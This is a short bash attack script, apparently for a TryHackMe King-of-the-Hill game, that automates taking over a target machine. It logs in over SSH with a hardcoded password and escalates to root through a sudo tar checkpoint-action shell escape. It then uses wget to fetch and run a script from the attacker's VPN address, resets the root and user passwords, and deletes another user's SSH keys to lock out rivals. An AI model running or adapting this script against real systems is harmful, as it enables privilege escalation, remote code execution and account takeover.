#!/bin/bash

# Created by @0xVoid :)

# https://github.com/0x76OID/KOTH

missing() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "Install '$1' before running $0 script."
    exit 1
  fi
}

missing sshpass

while getopts ":i:u:p:" opt; do
  case $opt in
    i) IP="$OPTARG" ;;
    u) username="$OPTARG" ;;
    p) new_password="$OPTARG" ;;
  esac
done

if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ]; then
  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
  exit 1
fi

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

sshpass -p J5rURvCa8DyTg3vR ssh -o StrictHostKeychecking=no donkey@"$IP" << EOF

    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    sleep 2

    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
    echo "$new_password" | passwd --stdin root
    echo "$new_password" | passwd --stdin donkey
    echo "$new_password" | passwd --stdin shrek
    rm -rf /home/shrek/.ssh
EOF
